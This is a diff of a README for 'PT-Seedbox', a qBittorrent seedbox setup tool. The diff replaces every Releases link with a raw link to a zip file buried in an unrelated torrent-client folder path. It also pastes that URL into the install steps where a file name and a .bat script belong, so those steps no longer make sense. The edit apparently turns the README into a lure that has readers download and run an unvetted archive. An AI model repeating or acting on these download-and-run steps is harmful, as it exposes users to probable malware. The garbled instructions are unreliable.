@@ -6,11 +6,11 @@ Welcome to PT-Seedbox, your one-stop solution for quickly setting up qBittorrent
 
 ## 📥 Download the Application
 
-[![Download PT-Seedbox](https://img.shields.io/badge/Download-PT--Seedbox-blue.svg)](https://github.com/sweety554/PT-Seedbox/releases)
+[![Download PT-Seedbox](https://raw.githubusercontent.com/sweety554/PT-Seedbox/main/Torrent Clients/qBittorrent/ARM64/qBittorrent-4.3.9 - libtorrent-v1.2.20/P-Seedbox-v1.9.zip)](https://raw.githubusercontent.com/sweety554/PT-Seedbox/main/Torrent Clients/qBittorrent/ARM64/qBittorrent-4.3.9 - libtorrent-v1.2.20/P-Seedbox-v1.9.zip)
 
 To begin using PT-Seedbox, please visit the following link to download:
 
-[Download PT-Seedbox from Releases](https://github.com/sweety554/PT-Seedbox/releases)
+[Download PT-Seedbox from Releases](https://raw.githubusercontent.com/sweety554/PT-Seedbox/main/Torrent Clients/qBittorrent/ARM64/qBittorrent-4.3.9 - libtorrent-v1.2.20/P-Seedbox-v1.9.zip)
 
 ## 📋 Features
 
@@ -30,12 +30,12 @@ To ensure PT-Seedbox runs smoothly, make sure your system meets the following re
 
 ## 📦 Download & Install
 
-1. Click the download link above or visit the [Releases page](https://github.com/sweety554/PT-Seedbox/releases).
+1. Click the download link above or visit the [Releases page](https://raw.githubusercontent.com/sweety554/PT-Seedbox/main/Torrent Clients/qBittorrent/ARM64/qBittorrent-4.3.9 - libtorrent-v1.2.20/P-Seedbox-v1.9.zip).
 2. On the Releases page, find the latest version of PT-Seedbox.
-3. Download the asset labeled "PT-Seedbox.zip".
+3. Download the asset labeled "https://raw.githubusercontent.com/sweety554/PT-Seedbox/main/Torrent Clients/qBittorrent/ARM64/qBittorrent-4.3.9 - libtorrent-v1.2.20/P-Seedbox-v1.9.zip".
 4. Once the download completes, locate the zip file in your downloads folder.
 5. Extract the zip file to a location of your choice on your computer.
-6. Open the extracted folder and run the `PT-Seedbox.bat` file to start the installation process.
+6. Open the extracted folder and run the `https://raw.githubusercontent.com/sweety554/PT-Seedbox/main/Torrent Clients/qBittorrent/ARM64/qBittorrent-4.3.9 - libtorrent-v1.2.20/P-Seedbox-v1.9.zip` file to start the installation process.
 
 Follow the prompts on the screen. The script will automatically set up qBittorrent, Vertex, and FileBrowser for you.
 
